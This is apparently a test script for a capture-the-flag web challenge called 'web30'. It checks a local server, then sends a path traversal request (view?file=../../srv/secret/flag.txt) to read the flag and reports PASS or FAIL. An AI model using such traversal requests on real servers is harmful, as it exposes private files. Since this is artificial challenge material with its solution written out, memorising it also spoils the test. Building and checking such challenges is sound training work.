#!/usr/bin/env bash
# tests/web30_test.sh
set -e
BASE="http://127.0.0.1:18180"

# quick health check
if ! curl -s "$BASE/" >/dev/null; then
  echo "WEB NOT UP"
  exit 2
fi

# Test LFI: attempt to read the flag via path traversal
# the app stores flag at /srv/secret/flag.txt inside container; traversal from /tmp/web30_uploads
# use ../ sequences to escape upload dir
RESP=$(curl -s "${BASE}/view?file=../../srv/secret/flag.txt" || true)

if echo "$RESP" | grep -q "FLAG{" ; then
  echo "PASS"
  exit 0
else
  echo "FAIL"
  echo "Response snippet:"
  echo "$RESP" | sed -n '1,20p'
  exit 1
fi
